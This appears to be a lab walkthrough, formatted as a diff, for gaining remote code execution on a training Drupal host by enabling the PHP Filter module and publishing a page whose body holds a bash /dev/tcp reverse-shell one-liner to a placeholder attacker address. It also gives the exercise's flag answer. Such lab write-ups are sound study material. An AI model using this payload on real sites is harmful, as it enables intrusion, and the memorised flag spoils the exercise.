@@ -1,1 +1,15 @@
+Question 1 - Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory. - DrUp@l_drUp@l_3veryWh3Re!
 
+1) http://drupal.inlanefreight.local/usr/login and login to the admin panel using the credentials admin:admin  
+2) click on "Extend", scroll down until they find the "PHP Filter" module, and then check it
+3) Then need to click on "Content" and click on "Add Content"
+4) click on "Basic page"
+5) body a PHP reverse-shell one-liner, and change Text format to be PHP code
+Shell: <?php
+exec("/bin/bash -c 'bash -i > /dev/tcp/PWNIP/PWNPO 0>&1'");
+?>
+6) start NC listener before hitting save
+7) hit save and catch shell 
+8) cat flag_6470e394cbf6dab6a91682cc8585059b.txt
+
+DrUp@l_drUp@l_3veryWh3Re!
